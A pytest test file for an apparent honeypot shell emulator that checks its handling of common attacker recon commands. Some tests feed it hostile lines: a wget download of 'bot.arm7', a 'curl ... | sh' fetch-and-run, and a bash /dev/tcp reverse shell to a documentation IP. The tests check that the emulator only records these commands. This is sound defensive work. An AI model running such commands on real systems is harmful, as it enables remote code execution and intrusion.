"""Deterministic shell emulator: the recon commands attackers actually type."""

from __future__ import annotations

import pytest

from mirage_trap.core.shell import Shell, ShellContext
from mirage_trap.core.vfs import VirtualFS
from mirage_trap.core.world import generate_world, load_world, save_world


@pytest.fixture(scope="module")
def world(tmp_path_factory):
    p = tmp_path_factory.mktemp("w") / "world.json"
    save_world(generate_world("nginx-php-legacy", 2024, "example-corp.test"), p)
    return load_world(p)


def sh(world, user="root", interactive=True):
    home = "/root" if user == "root" else ("/var/www/html" if user == "www-data" else f"/home/{user}")
    return Shell(world, VirtualFS(world, {}, {}), ShellContext(user=user, cwd=home, interactive=interactive))


async def test_identity_commands(world):
    s = sh(world)
    assert (await s.run("whoami"))[0] == "root\n"
    assert (await s.run("id -u"))[0] == "0\n"
    assert (await s.run("id -un"))[0] == "root\n"
    assert (await s.run("hostname"))[0] == world.hostname + "\n"
    out, _ = await s.run("uname -a")
    assert out.startswith(f"Linux {world.hostname} 5.4.0-169-generic")
    out, code = await s.run("id nosuchuser")
    assert code == 1 and "no such user" in out


async def test_pipes_redirects_and_status(world):
    s = sh(world)
    out, _ = await s.run("cat /etc/passwd | grep -c bash")
    assert int(out) >= 1
    out, _ = await s.run("echo a > /tmp/x; echo b >> /tmp/x; wc -l /tmp/x")
    assert out == "2 /tmp/x\n"
    out, _ = await s.run("false || echo fallback; true && echo ok")
    assert out == "fallback\nok\n"
    out, _ = await s.run("nope; echo $?")
    assert out.endswith("127\n")
    out, _ = await s.run("echo $(whoami)-`hostname`")
    assert out == f"root-{world.hostname}\n"


async def test_dash_vs_bash_messages(world):
    web = sh(world, "www-data", interactive=False)
    out, code = await web.run("frobnicate")
    assert out == "sh: 1: frobnicate: not found\n" and code == 127
    tty = sh(world)
    out, _ = await tty.run("frobnicate")
    assert out == "frobnicate: command not found\n"


async def test_permissions(world):
    web = sh(world, "www-data", interactive=False)
    out, _ = await web.run("cat /etc/shadow")
    assert "Permission denied" in out
    out, _ = await web.run("touch /etc/evil")
    assert "Permission denied" in out
    out, _ = await web.run("cat /var/www/html/config.php")
    assert world.data["secrets"]["db_password"] in out


async def test_recon_commands_reflect_the_world(world):
    s = sh(world)
    out, _ = await s.run("ip a")
    assert world.data["host"]["ip"] in out
    out, _ = await s.run("cat /etc/os-release")
    assert 'VERSION="20.04.6 LTS (Focal Fossa)"' in out
    out, _ = await s.run("ps aux")
    assert "nginx: master process" in out
    out, _ = await s.run("df -h")
    assert "/dev/" in out
    out, _ = await s.run("ls -la /root")
    assert ".bash_history" in out


async def test_downloads_are_never_fetched(world):
    iocs = []
    s = Shell(world, VirtualFS(world, {}, {}), ShellContext(user="root", cwd="/tmp", interactive=True),
              on_ioc=lambda k, v, ctx: iocs.append((k, v)))
    out, code = await s.run("wget http://203.0.113.66/bot.arm7")
    assert code == 0 and "saved" in out
    out, _ = await s.run("ls -la /tmp/bot.arm7")
    assert "bot.arm7" in out
    out, code = await s.run("curl -s http://203.0.113.66/x.sh | sh")
    assert ("url", "http://203.0.113.66/bot.arm7") in iocs
    assert ("url", "http://203.0.113.66/x.sh") in iocs


async def test_reverse_shell_is_recorded_not_opened(world):
    iocs = []
    s = Shell(world, VirtualFS(world, {}, {}), ShellContext(user="www-data", cwd="/tmp", interactive=False),
              on_ioc=lambda k, v, ctx: iocs.append((k, v)))
    await s.run("bash -c 'bash -i >& /dev/tcp/203.0.113.7/9001 0>&1'")
    assert ("reverse_shell", "203.0.113.7:9001") in iocs


async def test_sudo_prompts_for_password(world):
    emp = next(e for e in world.data["employees"] if e["shell_access"])
    s = sh(world, emp["username"])
    out, _ = await s.run("sudo -l")
    assert out.startswith(f"[sudo] password for {emp['username']}: ")
    assert s.ctx.pending is not None
    out, _ = await s.run(emp["password"])
    assert "may run the following commands" in out or "(ALL" in out


async def test_mysql_client_reaches_the_world_database(world):
    from mirage_trap.core.sqlemu import SqlEngine, base_image
    eng = SqlEngine(world, base_image(world))
    s = Shell(world, VirtualFS(world, {}, {}), ShellContext(user="root", cwd="/root", interactive=True), sql=lambda: eng)
    sec = world.data["secrets"]
    host = world.data["host"]["db_hostname"]
    login = f"mysql -h {host} -u {sec['db_user']} -p'{sec['db_password']}'"
    out, code = await s.run(f"{login} -e 'SELECT COUNT(*) FROM users' {sec['db_name']}")
    assert code == 0 and str(len(world.data["employees"])) in out
    out, code = await s.run(f"{login} -e 'SELECT * FROM nope'")
    assert code == 1 and out.startswith("ERROR 1146 (42S02) at line 1: Table")
    out, code = await s.run(f"mysql -h {host} -u {sec['db_user']} -pwrong -e 'select 1'")
    assert code == 1 and "ERROR 1045 (28000)" in out
    out, code = await s.run(f"mysql -u root -p'{sec['db_root_password']}'")
    assert code == 1 and "ERROR 2002" in out        # no local server: the DB lives on another host
